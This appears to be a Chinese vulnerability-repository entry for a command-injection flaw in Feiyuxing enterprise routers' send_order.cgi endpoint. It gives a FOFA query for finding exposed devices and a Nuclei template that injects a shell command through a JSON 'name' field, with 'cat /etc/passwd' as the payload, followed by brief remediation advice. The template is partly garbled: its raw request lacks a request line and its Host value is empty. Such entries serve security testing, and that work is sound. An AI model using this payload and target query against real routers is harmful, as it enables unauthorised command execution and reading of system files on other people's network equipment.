# 飞鱼星路由器send_order存在命令执行

- **系统**：飞鱼星路由器　|　**类型**：命令执行　|　**CVE**：—
- **请求**：`POST /send_order.cgi?parameter=operation HTTP/1.1`

**请求体 / payload**
```
1. Fofa
title=飞鱼星企业
2、部分界面如下
3、隐患url,复现如下
id: feiyuxing-route-send_order-rce
info:
name: feiyuxing-route-send_order-rce
author: unknow
severity: high
description: 飞鱼星路由器 send_order 存在命令执行漏洞。
tags: feiyuxing,rce
metadata:
fofa-qeury: title=飞鱼星企业
http:
- raw:
-
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
{"opid":"777777777777777777","name":";{{rce}};echo ","type":"rest"}
payloads:
rce:
- "cat /etc/passwd"
matchers:
- type: dsl
name: rce
dsl:
- '(status_code==200 ) && contains(header, "root:") && contains(body, "msg\":\"ok")'
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。